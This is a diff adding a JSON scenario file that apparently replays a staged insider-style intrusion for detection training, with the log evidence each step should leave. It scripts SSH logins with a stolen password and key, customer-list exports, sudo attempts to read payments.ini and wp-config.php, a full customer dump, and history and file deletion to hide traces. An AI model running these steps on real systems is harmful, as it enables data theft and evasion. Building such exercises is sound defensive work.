@@ -1,0 +1,90 @@
+{
+  "notes": "Terminal sessions with typed commands, held open for some minutes, as a person's are. The evidence grows in steps: quiet (the tool and list that Mia uses, from a new address), stronger (+600: an old key that Mia never uses, from a second address, while Mia herself is logged in from home; a second list (one that she also pulls on some days) in the history), loud (+760: sudo refusals for files marketing has no reason to read; +900: all customers through the support look-up mode). At +1060 the intruder removes what its account can remove: the export files and the shell history. The system logs stay.",
+  "steps": [
+    {
+      "at": -100,
+      "source": "intruder.0",
+      "label": "first login as Mia (password); ordinary look",
+      "timeout": 120,
+      "run": "(sleep 3; printf '%s\\n' 'tail -n 20 /var/log/nginx/larkspur.access.log'; sleep 40; printf '%s\\n' 'exit'; sleep 1) | SSHPASS='{secret:password}' sshpass -e ssh -tt -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o PubkeyAuthentication=no -o PreferredAuthentications=password -o NumberOfPasswordPrompts=1 mfischer@{target} > /dev/null"
+    },
+    {
+      "at": 150,
+      "source": "intruder.0",
+      "label": "quiet: password login; export the newsletter list, as Mia does",
+      "timeout": 300,
+      "run": "(sleep 3; printf '%s\\n' 'echo \"list newsletter\" | sudo -n /usr/local/sbin/larkspur-mailing-export'; sleep 6; printf '%s\\n' 'cat \"$(ls -t ~/newsletter-*.csv | head -1)\"'; sleep 150; printf '%s\\n' 'exit'; sleep 1) | SSHPASS='{secret:password}' sshpass -e ssh -tt -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o PubkeyAuthentication=no -o PreferredAuthentications=password -o NumberOfPasswordPrompts=1 mfischer@{target} > /root/.replay/l-newsletter.txt; grep -q '^[0-9][0-9]*,' /root/.replay/l-newsletter.txt",
+      "measure": "customer_records_left"
+    },
+    {
+      "at": 380,
+      "source": "intruder.0",
+      "label": "quiet: password login; look at what the account can do",
+      "timeout": 200,
+      "run": "(sleep 3; printf '%s\\n' 'id'; sleep 4; printf '%s\\n' 'sudo -n -l'; sleep 8; printf '%s\\n' 'ls -la ~'; sleep 70; printf '%s\\n' 'exit'; sleep 1) | SSHPASS='{secret:password}' sshpass -e ssh -tt -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o PubkeyAuthentication=no -o PreferredAuthentications=password -o NumberOfPasswordPrompts=1 mfischer@{target} > /dev/null"
+    },
+    {
+      "at": 600,
+      "source": "intruder.1",
+      "label": "stronger: old key login from a second address while Mia is logged in from home; export a second list",
+      "timeout": 300,
+      "run": "(sleep 3; printf '%s\\n' 'echo \"list recent\" | sudo -n /usr/local/sbin/larkspur-mailing-export'; sleep 6; printf '%s\\n' 'cat \"$(ls -t ~/recent-*.csv | head -1)\"'; sleep 130; printf '%s\\n' 'exit'; sleep 1) | ssh -tt -i /root/.replay/k1 -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no mfischer@{target} > /root/.replay/l-recent.txt; grep -q '^[0-9][0-9]*,' /root/.replay/l-recent.txt",
+      "leaves": [
+        {
+          "host": "web-01",
+          "path": "/var/log/auth.log",
+          "has": "Accepted publickey for mfischer from {src}"
+        },
+        {
+          "host": "web-01",
+          "path": "/var/log/larkspur-exports.log",
+          "has": "user=mfischer list=recent"
+        }
+      ],
+      "measure": "customer_records_left"
+    },
+    {
+      "at": 760,
+      "source": "intruder.1",
+      "label": "loud: tries to read the payment settings and the site settings with sudo (refused)",
+      "timeout": 200,
+      "run": "(sleep 3; printf '%s\\n' 'sudo cat /etc/larkspur/payments.ini'; sleep 3; printf '%s\\n' '{secret:password}'; sleep 6; printf '%s\\n' 'sudo cat /var/www/larkspur/wp-config.php'; sleep 6; printf '%s\\n' 'ls /etc/larkspur'; sleep 40; printf '%s\\n' 'exit'; sleep 1) | ssh -tt -i /root/.replay/k1 -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no mfischer@{target} > /dev/null",
+      "leaves": [
+        {
+          "host": "web-01",
+          "path": "/var/log/auth.log",
+          "has": "mfischer : command not allowed"
+        }
+      ]
+    },
+    {
+      "at": 900,
+      "source": "intruder.1",
+      "label": "loud: all customers with the support look-up mode of the export tool",
+      "timeout": 300,
+      "run": "(sleep 3; printf '%s\\n' 'echo \"ids 1-99999\" | sudo -n /usr/local/sbin/larkspur-mailing-export'; sleep 8; printf '%s\\n' 'cat \"$(ls -t ~/customers-*.csv | head -1)\"'; sleep 90; printf '%s\\n' 'exit'; sleep 1) | ssh -tt -i /root/.replay/k1 -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no mfischer@{target} > /root/.replay/l-all.txt; grep -q '^[0-9][0-9]*,' /root/.replay/l-all.txt",
+      "leaves": [
+        {
+          "host": "web-01",
+          "path": "/var/log/larkspur-exports.log",
+          "has": "user=mfischer ids=1-99999"
+        }
+      ],
+      "measure": "customer_records_left"
+    },
+    {
+      "at": 1060,
+      "source": "intruder.1",
+      "label": "cover: remove the export files of the shift and the shell history",
+      "timeout": 120,
+      "run": "(sleep 3; printf '%s\\n' 'unset HISTFILE'; sleep 2; printf '%s\\n' 'find ~ -maxdepth 1 -name \"*.csv\" -mmin -25 -delete'; sleep 3; printf '%s\\n' 'rm -f ~/.bash_history'; sleep 20; printf '%s\\n' 'exit'; sleep 1) | ssh -tt -i /root/.replay/k1 -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no mfischer@{target} > /dev/null",
+      "leaves": [
+        {
+          "host": "web-01",
+          "path": "/home/mfischer/.bash_history",
+          "lacks": "sudo cat /etc/larkspur/payments.ini"
+        }
+      ]
+    }
+  ]
+}
